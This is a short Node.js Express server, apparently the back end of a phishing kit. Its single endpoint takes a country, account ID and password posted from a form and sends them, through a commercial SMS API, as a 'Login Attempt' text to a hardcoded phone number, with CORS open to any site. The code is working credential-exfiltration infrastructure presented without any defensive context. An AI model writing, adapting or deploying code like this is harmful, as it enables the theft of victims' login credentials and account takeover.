const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/send-sms', async (req, res) => {
  const { country, accountId, password } = req.body;

  try {
    const response = await axios.post(
      'https://app.mobitechtechnologies.com/sms/sendsms',
      {
        mobile: '+254785799963',
        response_type: 'json',
        sender_name: 'MOBI-TECH',
        service_id: 0,
        message: `Login Attempt:\nCountry: ${country}\nUser: ${accountId}\nPass: ${password}`
      },
      {
        headers: {
          'Content-Type': 'application/json',
          'h_api_key': process.env.MOBITECH_API_KEY
        }
      }
    );

    res.status(200).json(response.data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Proxy listening on port ${PORT}`));
